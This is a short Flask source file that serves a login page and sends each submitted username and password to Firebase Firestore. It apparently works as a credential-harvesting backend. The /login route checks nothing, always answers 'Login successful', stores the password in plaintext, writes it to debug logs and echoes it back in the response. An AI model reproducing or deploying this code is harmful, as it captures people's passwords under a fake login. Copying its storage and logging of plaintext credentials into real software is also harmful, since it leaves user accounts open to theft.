import os
import json
import logging
import uuid
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, jsonify

import firebase_admin
from firebase_admin import credentials, firestore

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# Initialize Flask app
app = Flask(__name__)

# Firebase initialization using FIREBASE_CONFIG env variable
firebase_config = os.getenv('FIREBASE_CONFIG')
if not firebase_config:
    raise ValueError("FIREBASE_CONFIG environment variable is not set.")

try:
    config_dict = json.loads(firebase_config)
    cred = credentials.Certificate(config_dict)
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    logging.debug("Firebase initialized successfully.")
except Exception as e:
    logging.error(f"Firebase initialization failed: {e}")
    raise

# Routes
@app.route('/')
def login_page():
    return render_template('login.html')  # Make sure this file exists in /templates

@app.route('/login', methods=['POST'])
def login():
    try:
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            logging.warning("Username or password missing in login form")
            return jsonify({"status": "error", "message": "Username and password are required"}), 400

        user_data = {
            'username': username.strip(),
            'password': password.strip(),
            'timestamp': datetime.utcnow().isoformat(),
            'id': str(uuid.uuid4())
        }

        db.collection('users').add(user_data)
        logging.debug(f"User data added to Firestore: {user_data}")

        return jsonify({"status": "success", "message": "Login successful", "data": user_data}), 200
    except Exception as e:
        logging.error(f"Error in /login: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/success')
def success():
    return render_template('success.html')  # Ensure this file exists

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
